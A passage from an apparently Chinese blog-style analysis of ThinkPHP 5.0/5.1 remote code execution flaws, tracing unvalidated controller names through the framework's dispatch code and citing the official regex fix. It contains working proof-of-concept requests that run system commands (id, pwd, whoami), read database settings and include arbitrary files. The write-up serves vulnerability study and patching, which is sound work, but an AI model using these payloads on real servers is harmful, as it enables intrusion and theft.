class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p>这里以以这个POC进行分析，ThinkPHP 版本为<code>5.1.30</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure><p>![image-20200923201833962](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923201833962.png)</p><h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>漏洞存在于 <strong>ThinkPHP</strong> 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 <strong>远程代码执行漏洞</strong> 的产生。</p></blockquote><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.7&lt;=ThinkPHP5&lt;=5.0.22</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><p>不同版本的Payload，需要做相关的调整。</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在5.1.31的更新中，查看相关更新的信息，其中关于<code>修正控制器名获取</code> 的commit</p><p>![image-20200923221710652](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923221710652.png)</p><p>另外，官方对于此处更新，专门发了一次微信公告。<a href="https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A">https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A</a></p><p>内容如下：</p><blockquote><p>本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的<code>getshell</code>漏洞，受影响的版本包括<code>5.0</code>和<code>5.1</code>版本，推荐尽快更新到最新版本。如果暂时无法更新到最新版本，请开启强制路由。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150733.png" alt="image-20200923225433768"></p><p>默认情况下，ThinkPHP 不开启强制路由，并且开启了路由器兼容模式，<code>s</code>。</p><p>5.1.31 修复地址：<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><p>两个关键点：</p><ul><li>控制器名</li><li>强制路由</li></ul><p>by 七月火师傅：</p><blockquote><p>在没有开启强制路由，说明我们可以使用路由兼容模式 <strong>s</strong> 参数，而框架对控制器名没有进行足够的检测，说明可能可以调用任意的控制器，那么我们可以试着利用 <code>http://site/?s=模块/控制器/方法</code> 来测试一下。在先前的 <strong>ThinkPHP SQL注入</strong> 分析文章中，我们都有提到所有用户参数都会经过 <strong>Request</strong> 类的 <strong>input</strong> 方法处理，该方法会调用 <strong>filterValue</strong> 方法，而 <strong>filterValue</strong> 方法中使用了 <strong>call_user_func</strong> ，那么我们就来尝试利用这个方法。</p></blockquote><p><a href="https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select">https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p><code>call_user_func($filter,$value);</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150312.png" alt="image-20200923230344961"></p><p>可以看到系统命令成功执行。</p><p>根据修复的内容：对控制器名的获取，直接在获取控制器的地方下断点，来进行调试。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150235.png" alt="image-20200923231658510"></p><p>得出：控制器名是通过<code>$result[1]</code> 来获取的。</p><blockquote><p>而 <strong>$result</strong> 的值来源于兼容模式下的 <strong>pathinfo</strong> ，即 <strong>s</strong> 参数</p></blockquote><p>继续进行单步调试，程序会来到App类下的<code>run</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150152.png" alt="image-20200924094001917"></p><p>继续调用<code>Dispatch</code>类的<code>run</code>方法，该方法调用了<code>exec</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $option = <span class="keyword">$this</span>-&gt;rule-&gt;getOption();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测路由after行为</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($option[<span class="string">&#x27;after&#x27;</span>])) &#123;</span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;checkAfter($option[<span class="string">&#x27;after&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($dispatch <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">            <span class="keyword">return</span> $dispatch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据自动验证</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($option[<span class="string">&#x27;validate&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;autoValidate($option[<span class="string">&#x27;validate&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;exec();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 监听module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;module_init&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 实例化控制器</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">            $instance-&gt;registerMiddleware();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> (<span class="params">Request $request, $next</span>) <span class="title">use</span> (<span class="params">$instance</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 获取当前操作名</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// 执行操作方法</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_param_type&#x27;</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">            $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">&#x27;_empty&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 空操作</span></span><br><span class="line">            $call    = [$instance, <span class="string">&#x27;_empty&#x27;</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">&#x27;_empty&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 操作不存在</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;method not exists:&#x27;</span> . get_class($instance) . <span class="string">&#x27;-&gt;&#x27;</span> . $action . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;action_begin&#x27;</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">&#x27;controller&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br></pre></td></tr></table></figure><p>利用了反射机制，调用类的方法，这里类和方法都可控。</p><p>该方法中，<strong>未对实例化控制器和操作名进行任何过滤、合法性检测操作，这就是导致远程代码执行的直接原因。</strong></p><hr><p>如果直接拿该版本的 <strong>payload</strong> 去测试 <strong>ThinkPHP5.0.x</strong> 版本，会发现很多 <strong>payload</strong> 都不能成功。其原因是两个大版本已加载的类不同，导致可利用的类也不尽相同。具体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP 5.1.x                  ThinkPHP 5.0.x</span><br><span class="line">stdClass                        stdClass </span><br><span class="line">Exception                       Exception </span><br><span class="line">ErrorException                  ErrorException </span><br><span class="line">Closure                         Closure </span><br><span class="line">Generator                       Generator </span><br><span class="line">DateTime                        DateTime </span><br><span class="line">DateTimeImmutable               DateTimeImmutable </span><br><span class="line">DateTimeZone                    DateTimeZone </span><br><span class="line">DateInterval                    DateInterval </span><br><span class="line">DatePeriod                      DatePeriod </span><br><span class="line">LibXMLError                     LibXMLError </span><br><span class="line">DOMException                    DOMException </span><br><span class="line">DOMStringList                   DOMStringList </span><br><span class="line">DOMNameList                     DOMNameList </span><br><span class="line">DOMImplementationList           DOMImplementationList </span><br><span class="line">DOMImplementationSource         DOMImplementationSource </span><br><span class="line">DOMImplementation               DOMImplementation </span><br><span class="line">DOMNode                         DOMNode </span><br><span class="line">DOMNameSpaceNode                DOMNameSpaceNode </span><br><span class="line">DOMDocumentFragment             DOMDocumentFragment </span><br><span class="line">DOMDocument                     DOMDocument </span><br><span class="line">DOMNodeList                     DOMNodeList </span><br><span class="line">DOMNamedNodeMap                 DOMNamedNodeMap </span><br><span class="line">DOMCharacterData                DOMCharacterData </span><br><span class="line">DOMAttr                         DOMAttr </span><br><span class="line">DOMElement                      DOMElement </span><br><span class="line">DOMText                         DOMText </span><br><span class="line">DOMComment                      DOMComment </span><br><span class="line">DOMTypeinfo                     DOMTypeinfo </span><br><span class="line">DOMUserDataHandler              DOMUserDataHandler </span><br><span class="line">DOMDomError                     DOMDomError </span><br><span class="line">DOMErrorHandler                 DOMErrorHandler </span><br><span class="line">DOMLocator                      DOMLocator </span><br><span class="line">DOMConfiguration                DOMConfiguration </span><br><span class="line">DOMCdataSection                 DOMCdataSection </span><br><span class="line">DOMDocumentType                 DOMDocumentType </span><br><span class="line">DOMNotation                     DOMNotation </span><br><span class="line">DOMEntity                       DOMEntity </span><br><span class="line">DOMEntityReference              DOMEntityReference </span><br><span class="line">DOMProcessingInstruction        DOMProcessingInstruction </span><br><span class="line">DOMStringExtend                 DOMStringExtend </span><br><span class="line">DOMXPath                        DOMXPath </span><br><span class="line">finfo                           finfo </span><br><span class="line">LogicException                  LogicException </span><br><span class="line">BadFunctionCallException        BadFunctionCallException </span><br><span class="line">BadMethodCallException          BadMethodCallException </span><br><span class="line">DomainException                 DomainException </span><br><span class="line">InvalidArgumentException        InvalidArgumentException </span><br><span class="line">LengthException                 LengthException </span><br><span class="line">OutOfRangeException             OutOfRangeException </span><br><span class="line">RuntimeException                RuntimeException </span><br><span class="line">OutOfBoundsException            OutOfBoundsException </span><br><span class="line">OverflowException               OverflowException </span><br><span class="line">RangeException                  RangeException </span><br><span class="line">UnderflowException              UnderflowException </span><br><span class="line">UnexpectedValueException        UnexpectedValueException </span><br><span class="line">RecursiveIteratorIterator       RecursiveIteratorIterator </span><br><span class="line">IteratorIterator                IteratorIterator </span><br><span class="line">FilterIterator                  FilterIterator </span><br><span class="line">RecursiveFilterIterator         RecursiveFilterIterator </span><br><span class="line">CallbackFilterIterator          CallbackFilterIterator </span><br><span class="line">RecursiveCallbackFilterIterator RecursiveCallbackFilterIterator </span><br><span class="line">ParentIterator                  ParentIterator </span><br><span class="line">LimitIterator                   LimitIterator </span><br><span class="line">CachingIterator                 CachingIterator </span><br><span class="line">RecursiveCachingIterator        RecursiveCachingIterator </span><br><span class="line">NoRewindIterator                NoRewindIterator </span><br><span class="line">AppendIterator                  AppendIterator </span><br><span class="line">InfiniteIterator                InfiniteIterator </span><br><span class="line">RegexIterator                   RegexIterator </span><br><span class="line">RecursiveRegexIterator          RecursiveRegexIterator </span><br><span class="line">EmptyIterator                   EmptyIterator </span><br><span class="line">RecursiveTreeIterator           RecursiveTreeIterator </span><br><span class="line">ArrayObject                     ArrayObject </span><br><span class="line">ArrayIterator                   ArrayIterator </span><br><span class="line">RecursiveArrayIterator          RecursiveArrayIterator </span><br><span class="line">SplFileInfo                     SplFileInfo </span><br><span class="line">DirectoryIterator               DirectoryIterator </span><br><span class="line">FilesystemIterator              FilesystemIterator </span><br><span class="line">RecursiveDirectoryIterator      RecursiveDirectoryIterator </span><br><span class="line">GlobIterator                    GlobIterator </span><br><span class="line">SplFileObject                   SplFileObject </span><br><span class="line">SplTempFileObject               SplTempFileObject </span><br><span class="line">SplDoublyLinkedList             SplDoublyLinkedList </span><br><span class="line">SplQueue                        SplQueue </span><br><span class="line">SplStack                        SplStack </span><br><span class="line">SplHeap                         SplHeap </span><br><span class="line">SplMinHeap                      SplMinHeap </span><br><span class="line">SplMaxHeap                      SplMaxHeap </span><br><span class="line">SplPriorityQueue                SplPriorityQueue </span><br><span class="line">SplFixedArray                   SplFixedArray </span><br><span class="line">SplObjectStorage                SplObjectStorage </span><br><span class="line">MultipleIterator                MultipleIterator </span><br><span class="line">SessionHandler                  SessionHandler </span><br><span class="line">ReflectionException             ReflectionException </span><br><span class="line">Reflection                      Reflection </span><br><span class="line">ReflectionFunctionAbstract      ReflectionFunctionAbstract </span><br><span class="line">ReflectionFunction              ReflectionFunction </span><br><span class="line">ReflectionParameter             ReflectionParameter </span><br><span class="line">ReflectionMethod                ReflectionMethod </span><br><span class="line">ReflectionClass                 ReflectionClass </span><br><span class="line">ReflectionObject                ReflectionObject </span><br><span class="line">ReflectionProperty              ReflectionProperty </span><br><span class="line">ReflectionExtension             ReflectionExtension </span><br><span class="line">ReflectionZendExtension         ReflectionZendExtension </span><br><span class="line">__PHP_Incomplete_Class          __PHP_Incomplete_Class </span><br><span class="line">php_user_filter                 php_user_filter </span><br><span class="line">Directory                       Directory </span><br><span class="line">SimpleXMLElement                SimpleXMLElement </span><br><span class="line">SimpleXMLIterator               SimpleXMLIterator </span><br><span class="line">SoapClient                      SoapClient </span><br><span class="line">SoapVar                         SoapVar </span><br><span class="line">SoapServer                      SoapServer </span><br><span class="line">SoapFault                       SoapFault </span><br><span class="line">SoapParam                       SoapParam </span><br><span class="line">SoapHeader                      SoapHeader </span><br><span class="line">PharException                   PharException </span><br><span class="line">Phar                            Phar </span><br><span class="line">PharData                        PharData </span><br><span class="line">PharFileInfo                    PharFileInfo </span><br><span class="line">XMLReader                       XMLReader </span><br><span class="line">XMLWriter                       XMLWriter </span><br><span class="line">ZipArchive                      ZipArchive </span><br><span class="line">PDOException                    PDOException </span><br><span class="line">PDO                             PDO </span><br><span class="line">PDOStatement                    PDOStatement </span><br><span class="line">PDORow                          PDORow </span><br><span class="line">CURLFile                        CURLFile </span><br><span class="line">Collator                        Collator </span><br><span class="line">NumberFormatter                 NumberFormatter </span><br><span class="line">Normalizer                      Normalizer </span><br><span class="line">Locale                          Locale </span><br><span class="line">MessageFormatter                MessageFormatter </span><br><span class="line">IntlDateFormatter               IntlDateFormatter </span><br><span class="line">ResourceBundle                  ResourceBundle </span><br><span class="line">Transliterator                  Transliterator </span><br><span class="line">IntlTimeZone                    IntlTimeZone </span><br><span class="line">IntlCalendar                    IntlCalendar </span><br><span class="line">IntlGregorianCalendar           IntlGregorianCalendar </span><br><span class="line">Spoofchecker                    Spoofchecker </span><br><span class="line">IntlException                   IntlException </span><br><span class="line">IntlIterator                    IntlIterator </span><br><span class="line">IntlBreakIterator               IntlBreakIterator </span><br><span class="line">IntlRuleBasedBreakIterator      IntlRuleBasedBreakIterator </span><br><span class="line">IntlCodePointBreakIterator      IntlCodePointBreakIterator </span><br><span class="line">IntlPartsIterator               IntlPartsIterator </span><br><span class="line">UConverter                      UConverter </span><br><span class="line">JsonIncrementalParser           JsonIncrementalParser </span><br><span class="line">mysqli_sql_exception            mysqli_sql_exception </span><br><span class="line">mysqli_driver                   mysqli_driver </span><br><span class="line">mysqli                          mysqli </span><br><span class="line">mysqli_warning                  mysqli_warning </span><br><span class="line">mysqli_result                   mysqli_result </span><br><span class="line">mysqli_stmt                     mysqli_stmt </span><br><span class="line">Composer\Autoload\ComposerStaticInit81a0c33d33d83a86fdd976e2aff753d9            Composer\Autoload\ComposerStaticInit8a67cf04fc9c0db5b85a9d897c12a44c </span><br><span class="line">think\Loader                    think\Loader</span><br><span class="line">think\Error                     think\Error </span><br><span class="line">think\Container                 think\Config </span><br><span class="line">think\App                       think\App </span><br><span class="line">think\Env                       think\Request </span><br><span class="line">think\Config                    think\Hook </span><br><span class="line">think\Hook                      think\Env </span><br><span class="line">think\Facade                    think\Lang </span><br><span class="line">think\facade\Env                think\Log </span><br><span class="line">env                             think\Route</span><br><span class="line">think\Db </span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\facade\Route </span><br><span class="line">route </span><br><span class="line">think\Route </span><br><span class="line">think\route\Rule </span><br><span class="line">think\route\RuleGroup </span><br><span class="line">think\route\Domain </span><br><span class="line">think\route\RuleItem </span><br><span class="line">think\route\RuleName </span><br><span class="line">think\route\Dispatch </span><br><span class="line">think\route\dispatch\Url </span><br><span class="line">think\route\dispatch\Module </span><br><span class="line">think\Middleware </span><br><span class="line">think\Cookie </span><br><span class="line">think\View </span><br><span class="line">think\view\driver\Think </span><br><span class="line">think\Template </span><br><span class="line">think\template\driver\File </span><br><span class="line">think\Log </span><br><span class="line">think\log\driver\File </span><br><span class="line">think\Session </span><br><span class="line">think\Debug </span><br><span class="line">think\Cache </span><br><span class="line">think\cache\Driver </span><br><span class="line">think\cache\driver\File </span><br></pre></td></tr></table></figure><h2 id="利用总结-1"><a href="#利用总结-1" class="headerlink" title="利用总结"></a>利用总结</h2><p>by Mochazz:</p><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9/8.png" alt="8"></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><blockquote><p>代码层面：增加对控制器名的合法性检查。</p><p>应急层面：临时开启强制路由。</p></blockquote><p>官方的修复方法是：增加正则表达式 <code>^[A-Za-z](\w)*$</code> ，对控制器名进行合法性检测。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><h1 id="RCE3"><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h1><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 